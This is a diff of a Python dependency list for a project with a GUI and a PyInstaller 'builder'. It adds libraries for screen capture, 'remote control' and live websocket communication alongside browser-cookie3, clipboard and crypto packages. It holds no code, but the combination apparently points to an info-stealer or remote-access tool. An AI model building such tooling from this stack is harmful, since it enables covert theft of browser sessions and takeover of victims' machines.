@@ -1,6 +1,8 @@
 # For the GUI
 customtkinter
 requests
+websockets  # For live communication
+Pillow      # For image processing
 
 # For the builder
 pyinstaller
@@ -10,4 +12,8 @@ psutil
 pycryptodomex
 pywin32
 pyperclip
-browser-cookie3 # <--- THIS IS THE CORRECT, VERIFIED LIBRARY
+browser-cookie3
+mss         # For screen capture
+pyautogui   # For remote control
+websockets
+Pillow
